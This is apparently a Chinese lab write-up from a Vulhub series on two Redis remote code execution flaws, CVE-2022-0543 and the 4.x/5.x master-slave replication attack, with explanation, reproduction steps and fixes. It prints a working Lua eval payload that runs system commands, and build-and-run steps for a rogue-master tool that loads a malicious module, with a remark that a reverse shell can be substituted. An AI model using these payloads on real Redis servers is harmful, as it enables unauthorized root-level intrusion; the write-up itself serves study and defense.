---
title: Redis
published: 2026-10-25T10:00:00+08:00
description: 全面解析 Redis 的多个高危漏洞，涵盖 CVE-2022-0543（Debian/Ubuntu 打包导致的 Lua 沙盒逃逸 RCE），以及 Redis 4.x/5.x 主从复制导致的动态链接库加载 RCE。包含详细的原理分析与实战复现步骤。
image: images/Pasted image 20261023131844.png
tags:
  - Vulhub
  - CVE
category: Vulhub靶场
draft: false
pinned: false
lang: zh-CN
author: Ynm
comment: true
---

| 项目          | 详情                                                                      |
| ----------- | ----------------------------------------------------------------------- |
| **攻击机**     | Kali Linux（IP：192.168.197.128）                                          |
| **靶机**      | Ubuntu Server 24.04（IP：192.168.197.88）                                  |
| **CVSS 评分** | CVE-2022-0543: 10.0（严重） / 主从复制 RCE: 9.8（严重）                             |
| **典型漏洞编号**  | CVE-2022-0543 / Redis 4.x/5.x 主从复制未授权 RCE                               |
| **影响组件**    | Debian/Ubuntu 源打包的 Redis（CVE-2022-0543） / Redis 4.x / 5.0.5 及以下版本（主从复制） |
| **漏洞类型**    | 未授权访问 / 沙箱逃逸 / 远程代码执行（RCE）                                              |
| **利用条件**    | 存在未授权访问（无需密码） + 对应系统/版本环境                                               |
| **核心原理**    | Lua 沙箱遗留 `package` 对象加载恶意库 / 恶意主节点向从节点发送恶意模块文件并触发加载                     |

## 一、漏洞原理

Redis 默认情况下是未授权访问的（监听 0.0.0.0 且无密码），这为后续的 RCE 提供了最基础的条件。针对 Redis 的 RCE，有两个非常经典的漏洞：

**1. CVE-2022-0543（Lua 沙箱逃逸）**

Redis 具备执行 Lua 脚本的能力，正常情况下处于沙箱内，无法执行系统命令。但 Debian 和 Ubuntu 在打包 Redis 时，由于底层动态链接库（liblua）的绑定问题，将 `package` 这个本不该存在于沙箱内的对象遗留了下来。攻击者可以通过 `package.loadlib` 动态加载 `liblua5.1.so.0`，并执行其中的 `luaopen_io` 导出函数，从而恢复 `io` 库的权限，最终利用 `io.popen()` 执行任意系统命令。

**2. Redis 4.x/5.x 主从复制 RCE**

这是 Redis 最著名的漏洞之一。Redis 支持主从复制模式（Master-Slave）。攻击者可以伪装成一个 Master 节点，与目标 Redis（Slave）建立连接。攻击者发送 `FULLRESYNC` 指令后，将包含恶意 C 代码编译出的动态链接库（`.so` 文件）作为数据同步给目标。目标将其缓存到本地后，攻击者再通过指令让目标加载这个 `.so` 模块，从而触发 `system()` 函数执行任意命令。

## 二、漏洞复现

### 1. CVE-2022-0543（Lua 沙箱逃逸）
原理已经在上面解释过了，但这里还要再解释一下**沙箱（沙盒）逃逸**和**容器逃逸**的区别：

- **沙盒逃逸**：是指逃出 Lua 语言的限制，拿到了**容器内部**执行系统命令的权限。
- **容器逃逸**：是指逃出 Docker 的限制，拿到了**宿主机系统**的权限。

CVE-2022-0543 被称为“Lua 沙盒逃逸”，这里的“沙盒”特指 Redis 内部保护 Lua 脚本的安全限制环境。利用该漏洞可以突破 Lua 的限制执行系统命令，但获取的权限依然是 Docker 容器内部的权限。若想实现“容器逃逸”（突破 Docker 拿到宿主机权限），则需要利用其他特定的内核漏洞或 Docker 配置缺陷。

环境启动后，我们可以使用 Kali 自带的 `redis-cli` 直接连接目标：
```text wrap
redis-cli -h 192.168.197.88
```

连接成功后，直接使用 `eval` 命令执行构造好的 Lua 脚本：

**Lua 脚本说明**：这里借助 Lua 沙箱中遗留的变量 `package` 的 `loadlib` 函数来加载动态链接库 `/usr/lib/x86_64-linux-gnu/liblua5.1.so.0` 里的导出函数 `luaopen_io`。在 Lua 中执行这个导出函数，即可获得 `io` 库，再使用其执行命令：
```text wrap
eval 'local io_l = package.loadlib("/usr/lib/x86_64-linux-gnu/liblua5.1.so.0", "luaopen_io"); local io = io_l(); local f = io.popen("id", "r"); local res = f:read("*a"); f:close(); return res' 0
```

执行后，终端会直接回显 `uid=0(root) gid=0(root) groups=0(root)`，证明 RCE 成功。
![](images/Pasted%20image%2020261025111353.png)
后续把命令换成反弹shell即可，这里不再演示。
### 2. Redis 4.x/5.x 主从复制 RCE

原理已经在上面讲过了，对于主从复制漏洞，手动发送 Redis 协议和恶意 `.so` 文件非常繁琐。我们可以使用现成的自动化攻击工具 `redis-rogue-getshell`。

**① 克隆并进入工具目录**

```text wrap
# 1. 克隆工具仓库
git clone https://github.com/vulhub/redis-rogue-getshell.git
cd redis-rogue-getshell/RedisModulesSDK

# 2. 修复高版本 GCC 编译报错（自动在 exp.c 头部补上缺失的两个头文件）
sed -i '/#include <netinet\/in.h>/a #include <string.h>\n#include <arpa/inet.h>' exp/exp.c

# 3. 编译生成恶意模块文件 exp.so
make

# 4. 返回工具根目录，准备发起攻击
cd ..
```
上面的命令执行后有很多警告是没关系的。

**② 执行利用脚本**

使用工具向目标发送恶意模块并执行命令（注意替换目标 IP 和你的 Kali IP 及监听端口）：
```text wrap
python3 redis-master.py -r 192.168.197.88 -p 6379 -L 192.168.197.128 -P 8888 -f RedisModulesSDK/exp.so -c "id > /tmp/success"
```
*参数说明：`-r` 目标 IP，`-L` 攻击者 IP，`-P` 攻击者监听端口，`-c` 要执行的命令。*
![](images/Pasted%20image%2020261025153537.png)
**③ 验证**

由于工具可能会将回显通过反弹连接传回，也可以通过进入容器查看文件执行结果：
```text wrap
docker-compose exec redis ls -l /tmp
```
![](images/Pasted%20image%2020261025154429.png)
后续把命令换成反弹shell即可，这里不再演示。
## 三、漏洞原理总结

| 漏洞类型              | 核心成因                    | 利用入口       | 防御难点              |
| :---------------- | :---------------------- | :--------- | :---------------- |
| **CVE-2022-0543** | Linux 系统打包缺陷导致 Lua 沙箱逃逸 | Lua 脚本执行功能 | 依赖特定系统发行版         |
| **主从复制 RCE**      | Redis 设计特性允许加载外部模块      | 主从复制功能     | 4.x/5.x 默认配置下极易触发 |

**核心本质**：Redis 的漏洞往往不在于 Redis 本身存在溢出，而在于其**过于“信任”客户端**。无论是未授权访问、Lua 沙箱逃逸，还是主从复制加载恶意模块，都是因为 Redis 开放了过于强大的功能，且默认缺乏身份验证与网络隔离。

## 四、修复方案

1. **设置强密码**：在 `redis.conf` 中配置 `requirepass`，强制开启身份验证。
2. **禁止公网暴露**：修改 `bind 127.0.0.1`，或在防火墙限制 6379 端口仅允许特定 IP 访问。
3. **重命名危险命令**：在配置文件中通过 `rename-command` 禁用或重命名 `CONFIG`、`EVAL`、`SLAVEOF` 等高危命令。
4. **及时升级版本**：升级至 Redis 最新版本，或使用官方发布的修复版本。